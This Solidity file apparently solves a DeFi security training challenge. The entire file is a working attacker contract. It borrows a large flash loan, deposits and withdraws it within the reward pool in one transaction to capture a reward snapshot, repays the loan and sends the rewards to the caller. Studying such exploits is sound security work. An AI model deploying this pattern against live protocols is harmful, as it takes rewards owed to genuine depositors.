pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLenderPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

interface IERC20 {
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
    function balanceOf(address account) external returns (uint256);
}

contract TheRewarderAttacker {
    using Address for address payable;

    IFlashLenderPool lender;
    ITheRewarderPool rewarder;
    IERC20 liquidityToken;
    IERC20 rewardToken;

    function attack(IFlashLenderPool _lender, ITheRewarderPool _rewarder, IERC20 _liquidityToken, IERC20 _rewardToken) external {
        lender = _lender;
        rewarder = _rewarder;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;

        lender.flashLoan(1000000 ether);

        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    } 

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarder), amount);
        rewarder.deposit(amount);

        rewarder.withdraw(amount);
        liquidityToken.transfer(address(lender), amount);
    }

}
 